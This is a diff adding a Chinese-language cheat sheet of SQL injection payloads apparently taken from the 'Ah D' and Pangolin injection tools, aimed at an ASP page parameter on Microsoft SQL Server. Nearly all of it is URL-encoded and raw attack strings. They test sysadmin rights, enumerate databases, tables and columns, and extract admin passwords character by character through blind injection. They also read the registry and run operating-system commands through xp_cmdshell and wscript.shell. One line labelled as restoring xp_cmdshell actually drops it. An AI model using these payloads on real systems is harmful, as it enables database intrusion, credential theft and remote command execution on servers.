@@ -1,0 +1,102 @@
+啊D注入工具中使用的SQL注入语句
+
+爆user
+and char(124)+user+char(124)=0   ****char(124)= | *****
+?Id=1659%20and%20char(124)%2Buser%2Bchar(124)=0 
+
+and 1=1 : ?Id=1659%20%61%6E%64%20%31%3D%31
+
+and 1=2:   Id=1659%20%61%6E%64%20%31%3D%32
+检查SA权限：And char(124)+Cast(IS_SRVROLEMEMBER(0x730079007300610064006D0069006E00) as varchar(1))+char(124)=1
+
+爆当前库： and char(124)+db_name()+char(124)=0 --
+
+检查是否为mssql数据库：and exists (select * from sysobjects)
+%20%20and%20exists%20(select%20*%20from%20sysobjects)
+
+判断表名：
+panolin： ?Id=1659%20and%200%3C=(select%20count(*)%20from%20admin)%20and%201=1
+  admin也可以编码：=%61%64%6D%69%6E
+
+啊D：?Id=1659%20and%20exists%20(select%20*%20from%20[admin])
+
+爆列名：
+啊D：%20and%20exists%20(select%20[pwd]%20from%20[admin]) 
+
+panolin： %20and%200%3C=(select%20count(pwd)%20from%20admin)%20and%201=1   
+ %20and%200%3C=(select%20count(id)%20from%20admin)%20and%201=1
+    
+判断记录数：
+  %20and%20(select%20%20len(cstr(count(*)))%20from%20admin%20where%201=1)=2%20and%201=1  
+判断admin表中有几个记录 如:10 cstr(10) 转换成字符型就是"10" 那么他的长度就是2，所以这里=2
+
+阿D： /Article.asp?Id=1659%20and%20(select%20Count(1)%20from%20[admin]%20where%201=1)%20between%200%20and%208 判断在0-9999之间，这句是判断在0-8之间
+
+
+/Article.asp?Id=1659%20and%20(select%20%20abs(asc(mid(cstr(count(*)),2,1)))%20%20from%20admin%20where%201=1)=48%20and%201=1
+记录数的第一位=48 也就是0
+/Article.asp?Id=1659%20and%20(select%20%20abs(asc(mid(cstr(count(*)),2,1)))%20%20from%20admin%20where%201=1)=49%20and%201=1
+记录数的第二位=49 也就是1  所以=10
+
+猜字段长度：                                                                      
+Article.asp?Id=1659%20and%20(select%20top%201%20len(cstr(pwd))%20from%20(select%20top%201%20*%20from%20(select%20top%201%20*%20from%20admin%20where%201=1%20order%20by%201)%20t%20order%20by%201%20desc)t%20where%201=1)%3C=32%20and%201=1  第一条记录的字段长度
+                                                                                                                 top%201  第一条                     
+Article.asp?Id=1659%20and%20(select%20top%201%20len(cstr(pwd))%20from%20(select%20top%201%20*%20from%20(select%20top%202%20*%20from%20admin%20where%201=1%20order%20by%201)%20t%20order%20by%201%20desc)t%20where%201=1)%3C=32%20and%201=1  第二条记录的字段
+                                                                                                                 top%202   第二条                
+阿D：  
+       Article.asp?Id=1659%20and%20(select%20top%201%20len([pwd])%20from%20(Select%20Top%201%20[pwd]%20from%20[admin]%20where%201=1%20order%20by%20[pwd])%20T%20Order%20by%20[pwd]%20desc)%20between%200%20and%2032 判断第一条记录的字段长度0-32之间
+                                                                                     top%202   第二条       
+       Article.asp?Id=1659%20and%20(select%20top%201%20len([pwd])%20from%20(Select%20Top%202%20[pwd]%20from%20[admin]%20where%201=1%20order%20by%20[pwd])%20T%20Order%20by%20[pwd]%20desc)%20between%200%20and%2032 判断第二条记录的字段长度0-32之间
+ 两个top 1 保留一个top 1 ,改另外一个成top x 就可以猜第x个字段长度 或改最后一个top (pangolin就是改最后一个top来爆第N杀记录的长度)
+
+
+猜字段内容：
+%20and%20(select%20top%201%20abs(asc(mid(cstr(pwd),1,1)))%20%20from%20(select%20top%201%20*%20from%20(select%20top%201%20*%20from%20admin%20where%201=1%20order%20by%201)%20t%20order%20by%201%20desc)t%20where%201=1)%3E32%20and%201=1 第一条记录、第一位的asc码
+%20and%20(select%20top%201%20abs(asc(mid(cstr(pwd),19,1)))%20%20from%20(select%20top%201%20*%20from%20(select%20top%201%20*%20from%20admin%20where%201=1%20order%20by%201)%20t%20order%20by%201%20desc)t%20where%201=1)%3E32%20and%201=1 第19位的asc码
+
+阿D：
+/Article.asp?Id=1659%20and%20(select%20top%201%20asc(mid(cstr(pwd),7,1))%20from%20(Select%20Top%201%20[pwd]%20from%20[admin]%20where%201=1%20order%20by%20[pwd])%20T%20Order%20by%20[pwd]%20desc)%20%20between%2030%20and%2080 第一条记录、第7位的asc码在30~80之间
+                                                                                            top%201  第一条                                                                                                              
+                                                                                            top%202   第二条
+/Article.asp?Id=1659%20and%20(select%20top%201%20asc(mid(cstr(pwd),7,1))%20from%20(Select%20Top%202%20[pwd]%20from%20[admin]%20where%201=1%20order%20by%20[pwd])%20T%20Order%20by%20[pwd]%20desc)%20%20between%2030%20and%2080 第二条记录、第7位的asc码在30~80之间
+
+
+
+
+
+
+猜中文：
+    /Article.asp?Id=1659%20and%20(select%20%20abs(asc(mid(cstr(count(*)),2,1)))%20%20from%20admin%20where%201=1)%3C=256%20and%201=1 第一个列的内容是不是》=256
+/Article.asp?Id=1659%20and%20(select%20%20abs(asc(mid(cstr(count(*)),1,1)))%20%20from%20admin%20where%201=1)%3C=256%20and%201=1 第二个列是不是》=256
+
+检查数据库中有多少个库：And (Select char(124)+Cast(Count(1) as varchar(8000))+char(124) From [sysobjects] where xtype=char(85) and status >1)>0
+
+爆第一个库： And (Select Top 1 char(124)+name+char(124) From (Select Top 1 [id],[name] From [sysobjects] where xtype=char(85) and status >1 Order by [id],[name]) T Order by [id] desc,[name] desc)>0 --
+
+爆第N个库：And (Select Top 1 char(124)+name+char(124) From (Select Top |N| [id],[name] From [sysobjects] where xtype=char(85) and status >1 Order by [id],[name]) T Order by [id] desc,[name] desc)>0 --
+
+爆有多少个列名：And (Select char(124)+Cast(Count(*) as varchar(8000))+char(124) From [库名]..[syscolumns] where (id = (SELECT TOP 1 id FROM [sysobjects] WHERE name = char(97)+char(116)+char(116)+char(97)+char(99)+char(104))))>0
+
+爆列名：And (Select Top 1 char(124)+name+char(124) From (Select Top 1 [name] From [syscolumns] where (id = (SELECT TOP 1 id FROM [sysobjects] WHERE name = char(97)+char(116)+char(116)+char(97)+char(99)+char(104))) Order by [name]) T Order by [name] desc)>0 --
+
+读注册表:
+DROP TABLE D99_REG;CREATE TABLE D99_REG([ID] int,[Data][varchar](255))--
+
+DECLARE @result varchar(255) EXEC master.dbo.xp_regread'HKEY_LOCAL_MACHINE','SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots', '/',@result output insert into D99_REG([ID],[data]) values('9999',@result);--
+
+And (Select char(124)+Cast(Count(1) as varchar(8000))+char(124) From D99_REG)>0 --
+
+执行CMD
+
+DROP TABLE D99_CMD;CREATE TABLE D99_CMD([Data][varchar](1000),ID int NOT NULL IDENTITY (1,1)) insert D99_CMD exec master.dbo.xp_cmdshell 'dir c:\'--
+
+And (Select char(124)+Cast(Data as varchar(4000))+char(124) From D99_CMD)>0--
+
+执行WSCRIPT:
+
+DECLARE @s int EXEC sp_oacreate [wscript.shell], @s out EXEC sp_oamethod @s,[run], NULL, [cmd.exe /c dir c:\] --
+
+恢复XP_CMDSHELL
+
+;exec master..sp_dropextendedproc 'xp_cmdshell'--
+ 
